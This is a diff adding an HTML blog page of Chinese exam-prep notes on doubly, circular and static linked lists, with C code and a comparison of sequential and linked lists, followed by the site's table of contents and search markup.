+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">L</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//内存分配失败
+</span></span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">L</span><span class="o">-&gt;</span><span class="n">prior</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">L</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="243-双链表的插入操作">2.4.3 双链表的插入操作</h4>
+<p><strong>双链表的后插操作：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//在p节点之后插入s节点（尾插法也含括在内）
+</span></span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">InsertNextNode</span><span class="p">(</span><span class="n">DNode</span><span class="o">*</span> <span class="n">p</span><span class="p">,</span> <span class="n">DNode</span><span class="o">*</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">s</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">s</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">prior</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">s</span><span class="o">-&gt;</span><span class="n">prior</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>双链表的前插操作：</strong>
+由于双链表可以轻松的找到给定节点的前驱节点，再对该前驱节点调用InsertNextNode()函数即可实现前插操作。</p>
+<h4 id="244-双链表的删除操作">2.4.4 双链表的删除操作</h4>
+<p><strong>删除该节点的后继节点：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//删除该节点的后继节点
+</span></span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">DeleteNextNode</span><span class="p">(</span><span class="n">DNode</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//p的值不合法
+</span></span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DNode</span><span class="o">*</span> <span class="n">q</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">q</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//p没有后继节点
+</span></span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">q</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//p的后继节点不是最后一个节点
+</span></span></span><span class="line"><span class="cl">		<span class="n">q</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">prior</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">free</span><span class="p">(</span><span class="n">q</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>删除该节点的前驱节点：</strong>
+同理，找到前驱节点的前一个节点，调用上述代码即可。</p>
+<h4 id="245-双链表的查找">2.4.5 双链表的查找</h4>
+<p>双链表同单链表一样，不具有随机存取的性质，因此<strong>按值查找和按位查找</strong>，都只能通过遍历实现，时间复杂度都为<strong>O(n)</strong>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//后向遍历
+</span></span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//对该节点进行操作的代码
+</span></span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//前向遍历
+</span></span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//对该节点进行操作的代码
+</span></span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">prior</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//跳过头结点前向遍历
+</span></span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">prior</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//对该节点进行操作的代码
+</span></span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">prior</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="25-循环链表">2.5 循环链表</h3>
+<h4 id="251-循环单链表">2.5.1 循环单链表</h4>
+<p>循环单链表与单链表<strong>主要区别在于</strong>：表中最后一个节点的指针域next不再指向NULL而是指向头结点。<strong>值得注意的是</strong>在初始化的时候，头结点的指针不设为NULL，而是指向自己，对应判空操作等也发生变化。初始化代码和结构图示如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">InitDLinkList</span><span class="p">(</span><span class="n">DLinkList</span><span class="o">&amp;</span> <span class="n">L</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">L</span> <span class="o">=</span> <span class="p">(</span><span class="n">DNode</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">DNode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">L</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//内存分配失败
+</span></span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">L</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">L</span><span class="p">;</span>  <span class="c1">//指针指向自己
+</span></span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><img src="http://tuchuang.mrlxl.cn/picture/20260204151610024.png" alt="">
+由于循环单链表是一个环，所以在任何位置进行<strong>插入和删除操作都是等价的</strong>，因此无需像单链表那样判断是否达到表尾。为了提高效率，循环单链表有时不设置头指针，<strong>仅设置尾指针</strong>，这样在表头或者表尾插入元素的时间复杂度仅为<strong>O(1)</strong>，若仅设置头指针，在表尾插入元素需要遍历整个链表，时间复杂度则为<strong>O(n)</strong>。</p>
+<h4 id="252-循环双链表">2.5.2 循环双链表</h4>
+<p>基于循环单链表的概念，不难推导出循环双链表。<strong>不同之处</strong>在于：循环双链表中每个节点还多了一个指向前一个节点的指针域prior（多了一个反向的环）。
+而<strong>双链表与循环双链表的不同之处</strong>在于：原先双链表头结点的指针域prior不再为NULL而是指向尾节点，原先双链表尾节点的指针域next不再为NULL而是指向头节点。<strong>值得注意的是</strong>在初始化的时候，头结点的两个指针同样不设为NULL，而是指向自己，对应判空操作等也发生变化。初始化代码和结构图示如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">InitDLinkList</span><span class="p">(</span><span class="n">DLinkList</span><span class="o">&amp;</span> <span class="n">L</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">L</span> <span class="o">=</span> <span class="p">(</span><span class="n">DNode</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">DNode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">L</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//内存分配失败
+</span></span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">L</span><span class="o">-&gt;</span><span class="n">prior</span> <span class="o">=</span> <span class="n">L</span><span class="p">;</span> <span class="c1">//指针指向自己
+</span></span></span><span class="line"><span class="cl">	<span class="n">L</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">L</span><span class="p">;</span>  <span class="c1">//指针指向自己
+</span></span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><img src="http://tuchuang.mrlxl.cn/picture/20260204145758785.png" alt=""></p>
+<p>同样，在进行插入操作时，不需判断是否达到表尾。</p>
+<h3 id="26-静态链表">2.6 静态链表</h3>
+<blockquote>
+<p><strong>静态链表</strong>是用<strong>数组</strong>来模拟线性表的链式存储结构。</p>
+</blockquote>
+<p>静态链表在考研中考察的不多，这里简单介绍一二：静态链表的每个节点都包含两个域即data域和next域，与动态链表不同的是，这里的next域实际上是节点在数组中的相对位置（数组下标），也称<strong>游标</strong>。类似于顺序表，静态链表也要先分配一块连续的内存空间。
+静态链表以0号节点作为头结点，以游标为-1的节点作为尾节点，图示如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260204161416474.png" alt="静态链表"></p>
+<p>在初始化的时候为了防止内存中原本存在的脏数据，我们可以先将所有的游标都置为一个数（如-2），这样在后续进行插入操作时也方便判断哪些是空节点方便插入。静态链表节点定义和初始化操作代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define MaxSize 10        </span><span class="c1">// 静态链表的最大长度
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">int</span> <span class="n">ElemType</span><span class="p">;</span>     <span class="c1">// 数据元素类型，可根据需求改为char/结构体等
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>          <span class="c1">// 静态链表结构类型的定义
+</span></span></span><span class="line"><span class="cl">    <span class="n">ElemType</span> <span class="n">data</span><span class="p">;</span>        <span class="c1">// 存储数据元素
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">next</span><span class="p">;</span>             <span class="c1">// 下一个元素的数组下标，游标置为-2
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">SLinkList</span><span class="p">[</span><span class="n">MaxSize</span><span class="p">];</span>     <span class="c1">// 这样的定义方式少见，和前面的LNode和LinkList一样，用于区分概念
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 静态链表初始化函数：所有元素的游标next统一置为-2
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">InitSLinkList</span><span class="p">(</span><span class="n">SLinkList</span> <span class="n">L</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MaxSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">next</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>   <span class="c1">// 核心：所有游标置为-2
+</span></span></span><span class="line"><span class="cl">        <span class="c1">// 可选：数据域初始化（如置空/0，避免随机值）
+</span></span></span><span class="line"><span class="cl">        <span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//测试代码
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">testSLinkList</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SLinkList</span> <span class="n">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ......后续代码
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="27-顺序表和链表的比较">2.7 顺序表和链表的比较</h3>
+<p>在第一章绪论中介绍过，探讨一个数据结构，一定要先看他的三要素。本小节将从数据结构三要素方面对顺序表和链表进行比较（简答题考察）。</p>
+<h4 id="271-逻辑结构比较">2.7.1 逻辑结构比较</h4>
+<p>都是线性表，都属于线性结构。</p>
+<h4 id="272-存储结构比较">2.7.2 存储结构比较</h4>
+<p>顺序表优点：支持随机存取、存储密度高。
+顺序表缺点：大片连续空间分配不方便，改变容量不方便。</p>
+<p>链表优点：离散的小空间分配方便，改变容量方便。
+链表缺点：不可随机存取，存储密度低。</p>
+<h4 id="273-数据的运算比较创销增删改查">2.7.3 数据的运算比较（创销，增删改查）</h4>
+<p><strong>创：链表更胜一筹</strong></p>
+<ul>
+<li><strong>顺序表：</strong>
+需要预分配大片连续空间。若分配空间过小，则之后不方便拓展容量；若分配空间过大，则浪费内存资源。
+静态分配：静态数组 -&gt; 容量不可改变。
+动态分配：动态数组（malloc、free）容量可改变，但需要移动大量元素，时间代价高。</li>
+<li><strong>链表：</strong>
+只需分配一个头结点（也可以不要头结点，只声明一个头指针），之后方便拓展。</li>
+</ul>
+<p><strong>销：</strong></p>
+<ul>
+<li><strong>顺序表：</strong>
+静态分配：将length设置为0即可，系统会自动回收空间（栈区）。
+动态分配：将首地址指针传给free(),手动回收空间。</li>
+<li><strong>链表：</strong>
+每个节点都需单独free()回收。</li>
+</ul>
+<p><strong>增删：链表更胜一筹</strong></p>
+<ul>
+<li><strong>顺序表：</strong>
+插入 / 删除元素要将后续元素都后移/前移，时间复杂度 <strong>O(n)</strong>，时间开销主要来自移动元素</li>
+<li><strong>链表：</strong>
+插入 / 删除元素只需修改指针即可，时间复杂度 O (n)，时间开销主要来自查找目标元素。</li>
+<li><strong>注意：</strong>
+虽然时间复杂度都是O(n)，但是在实际过程中若若数据元素很大，则顺序表移动的时间代价很高，而查找元素的时间代价更低。所以链表更优。</li>
+</ul>
+<p><strong>改查：顺序表更胜一筹</strong></p>
+<ul>
+<li><strong>顺序表：</strong>
+按位查找：O (1)
+按值查找：O (n)
+若表内元素有序，可在 O (log₂n) 时间内找到（二分查找&hellip; ）</li>
+<li><strong>链表：</strong>
+按位查找：O (n)
+按值查找：O (n)</li>
+</ul>
+<p><img src="http://tuchuang.mrlxl.cn/picture/20260204173348155.png" alt="顺链比较"></p>
+<h2 id="附言">附言</h2>
+<p>本文参考文章：《考研视角下的C语言(下)》http://mrlxl.cn/index.php/2026/01/24/test-9/</p>
+
+    </article>
+    <p style="text-align: center; margin-top: 50px; opacity: 0.6; font-size: 0.9em;">总是在探索未知</p>
+
+  </div>
+  <div class="sidebar-right">
+    <h3>大纲</h3>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#数据结构之绪论与线性表">数据结构之绪论与线性表</a>
+      <ul>
+        <li><a href="#第二章_线性表">第二章_线性表</a>
+          <ul>
+            <li><a href="#21-线性表的定义和基本操作">2.1 线性表的定义和基本操作</a>
+              <ul>
+                <li><a href="#211-线性表的定义">2.1.1 线性表的定义</a></li>
+                <li><a href="#212-线性表的基本操作">2.1.2 线性表的基本操作</a></li>
+              </ul>
+            </li>
+            <li><a href="#22-顺序表">2.2 顺序表</a>
+              <ul>
+                <li><a href="#221-顺序表的定义">2.2.1 顺序表的定义</a></li>
+                <li><a href="#222-顺序表的两种实现方式">2.2.2 顺序表的两种实现方式</a></li>
+                <li><a href="#223-顺序表的插入">2.2.3 顺序表的插入</a></li>
+                <li><a href="#224-顺序表的删除">2.2.4 顺序表的删除</a></li>
+                <li><a href="#225-顺序表的查找">2.2.5 顺序表的查找</a></li>
+              </ul>
+            </li>
+            <li><a href="#23-单链表">2.3 单链表</a>
+              <ul>
+                <li><a href="#231-单链表的定义">2.3.1 单链表的定义</a></li>
+                <li><a href="#232-单链表的两种初始化方式">2.3.2 单链表的两种初始化方式</a></li>
+                <li><a href="#233-单链表的插入操作">2.3.3 单链表的插入操作</a></li>
+                <li><a href="#234-单链表的删除操作">2.3.4 单链表的删除操作</a></li>
+                <li><a href="#235-单链表的查找">2.3.5 单链表的查找</a></li>
+                <li><a href="#236-单链表的建立">2.3.6 单链表的建立</a></li>
+              </ul>
+            </li>
+            <li><a href="#24-双链表">2.4 双链表</a>
+              <ul>
+                <li><a href="#241-双链表的定义">2.4.1 双链表的定义</a></li>
+                <li><a href="#242-双链表的实现方式">2.4.2 双链表的实现方式</a></li>
+                <li><a href="#243-双链表的插入操作">2.4.3 双链表的插入操作</a></li>
+                <li><a href="#244-双链表的删除操作">2.4.4 双链表的删除操作</a></li>
+                <li><a href="#245-双链表的查找">2.4.5 双链表的查找</a></li>
+              </ul>
+            </li>
+            <li><a href="#25-循环链表">2.5 循环链表</a>
+              <ul>
+                <li><a href="#251-循环单链表">2.5.1 循环单链表</a></li>
+                <li><a href="#252-循环双链表">2.5.2 循环双链表</a></li>
+              </ul>
+            </li>
+            <li><a href="#26-静态链表">2.6 静态链表</a></li>
+            <li><a href="#27-顺序表和链表的比较">2.7 顺序表和链表的比较</a>
+              <ul>
+                <li><a href="#271-逻辑结构比较">2.7.1 逻辑结构比较</a></li>
+                <li><a href="#272-存储结构比较">2.7.2 存储结构比较</a></li>
+                <li><a href="#273-数据的运算比较创销增删改查">2.7.3 数据的运算比较（创销，增删改查）</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#附言">附言</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+  </main>
+  
+  
+  <div id="search-modal" class="search-modal">
+    <div class="search-modal-content">
+      
+      <div class="mobile-search-header" style="display: none;">
+        <button id="mobile-exit-btn" class="mobile-icon-btn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+        </button>
+      </div>
+
+      <div class="search-input-wrapper">
+        <input type="text" id="search-input" placeholder="搜索文章标题或内容...">
+        <button id="mobile-search-btn" class="mobile-icon-btn mobile-search-submit" style="display: none;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        </button>
+        <span class="search-loading" style="display: none;">第一次加载搜索功能可能需要一点时间...</span>
+      </div>
+      <div id="search-results" class="search-results"></div>
+      <div class="search-footer">
+        <span class="desktop-only">ESC 关闭</span>
+        <span class="desktop-only">↑↓ 选择</span>
+        <span class="desktop-only">Enter 跳转</span>
+      </div>
+    </div>
+  </div>
+
+  <script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs';
+
+  mermaid.initialize({ 
+    startOnLoad: false,
+    theme: document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default',
+    securityLevel: 'loose'
+  });
+
+  document.addEventListener('DOMContentLoaded', async () => {
+    
+    await mermaid.run({
+      querySelector: '.mermaid'
+    });
+  });
+</script>
+
+</body>
+</html>
